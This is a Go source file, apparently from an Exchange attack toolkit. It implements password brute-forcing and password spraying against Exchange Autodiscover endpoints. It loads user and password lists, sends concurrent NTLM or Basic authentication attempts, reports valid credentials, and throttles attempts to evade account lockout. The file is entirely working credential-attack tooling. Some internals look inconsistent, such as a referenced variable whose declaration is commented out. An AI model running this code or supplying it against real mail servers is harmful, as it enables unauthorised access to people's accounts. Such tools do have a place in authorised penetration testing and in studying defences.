package autodiscover

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/sensepost/ruler/http-ntlm"
)

type Result struct {
	Username string
	Password string
	Index    int
	Status   int
	Error    error
}

//var autodiscoverStep int = 0

func autodiscoverDomain(domain string) string {
	var autodiscoverURL string

	//check if this is just a domain or a redirect (starts with http[s]://)
	if m, _ := regexp.Match("http[s]?://", []byte(domain)); m == true {
		autodiscoverURL = domain
	} else {
		//create the autodiscover url
		if autodiscoverStep == 0 {
			autodiscoverURL = createAutodiscover(domain, true)
			if autodiscoverURL == "" {
				autodiscoverStep++
			}
		}
		if autodiscoverStep == 1 {
			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), true)
			if autodiscoverURL == "" {
				autodiscoverStep++
			}
		}
		if autodiscoverStep == 2 {
			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), false)
			if autodiscoverURL == "" {
				return ""
			}
		}
	}

	fmt.Printf("[*] Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	req.Header.Add("Content-Type", "text/xml")

	client := http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		if autodiscoverStep < 2 {
			autodiscoverStep++
			return autodiscoverDomain(domain)
		}
		return ""
	}
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return autodiscoverURL
	}
	if autodiscoverStep < 2 {
		autodiscoverStep++
		return autodiscoverDomain(domain)
	}
	return ""
}

//BruteForce function takes a domain/URL, file path to users and filepath to passwords whether to use BASIC auth and to trust insecure SSL
//And whether to stop on success
func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
	fmt.Println("[*] Trying to Autodiscover domain")
	autodiscoverURL := autodiscoverDomain(domain)

	if autodiscoverURL == "" {
		return
	}
	usernames := readFile(usersFile)
	if usernames == nil {
		return
	}
	passwords := readFile(passwordsFile)
	if passwords == nil {
		return
	}

	result := make(chan Result)
	count := 0
	attempts := 0

	for _, p := range passwords {
		if p != "" {
			attempts++
		}
		count = 0
		for ui, u := range usernames {
			if u == "" || p == "" {
				continue
			}
			count++
			go func(u string, p string, i int) {
				out := connect(autodiscoverURL, u, p, basic, insecure)
				out.Index = i
				result <- out
			}(u, p, ui)
		}

		for i := 0; i < count; i++ {
			select {
			case res := <-result:
				if verbose == true && res.Status != 200 {
					fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
					if res.Error != nil {
						fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
					}
				}
				if res.Status == 200 {
					fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
					//remove username from username list (we don't need to brute something we know)
					usernames = append(usernames[:res.Index], usernames[res.Index+1:]...)
				}
				if stopSuccess == true && res.Status == 200 {
					return
				}
			}
		}
		if attempts == consc {
			fmt.Printf("\033[31m[*] Multiple attempts. To prevent lockout - delaying for %d minutes.\033[0m\n", delay)
			time.Sleep(time.Minute * (time.Duration)(delay))
			attempts = 0
		}
	}
}

func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
	fmt.Println("[*] Trying to Autodiscover domain")
	autodiscoverURL := autodiscoverDomain(domain)

	if autodiscoverURL == "" {
		return
	}
	userpass := readFile(userpassFile)
	if userpass == nil {
		return
	}

	result := make(chan Result)
	count := 0

	for _, up := range userpass {
		count++
		if up == "" {
			continue
		}
		// verify colon-delimited username:password format
		s := strings.SplitN(up, ":", 2)
		if len(s) < 2 {
			fmt.Printf("[!] Skipping improperly formatted entry in %s:%d\n", userpassFile, count)
			continue
		}
		u, p := s[0], s[1]
		count = 0

		//skip blank username
		if u == "" {
			continue
		}

		go func(u string, p string) {
			out := connect(autodiscoverURL, u, p, basic, insecure)
			result <- out
		}(u, p)

		select {
		case res := <-result:
			if verbose == true && res.Status != 200 {
				fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
				if res.Error != nil {
					fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
				}
			}
			if res.Status == 200 {
				fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
			}
			if stopSuccess == true && res.Status == 200 {
				return
			}
		}
	}
}

func readFile(filename string) []string {
	var outputs []string

	data, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("Input file not found")
		return nil
	}

	for _, line := range strings.Split(string(data), "\n") {
		outputs = append(outputs, line)
	}
	return outputs
}

func connect(autodiscoverURL, user, password string, basic, insecure bool) Result {
	result := Result{user, password, -1, -1, nil}

	client := http.Client{}
	if basic == false {
		//check if this is a first request or a redirect
		//create an ntml http client
		client = http.Client{
			Transport: &httpntlm.NtlmTransport{
				Domain:   "",
				User:     user,
				Password: password,
				Insecure: insecure,
			},
		}
	}

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	req.Header.Add("Content-Type", "text/xml")

	//if we have been redirected to outlook, change the auth header to basic auth
	if basic == false {
		req.SetBasicAuth(user, password)
	}

	resp, err := client.Do(req)

	if err != nil {
		//check if this error was because of ntml auth when basic auth was expected.
		if m, _ := regexp.Match("illegal base64", []byte(err.Error())); m == true {
			client = http.Client{}
			resp, err = client.Do(req)
		} else {
			result.Error = err
			return result
		}

	}

	defer resp.Body.Close()
	result.Status = resp.StatusCode
	return result
}
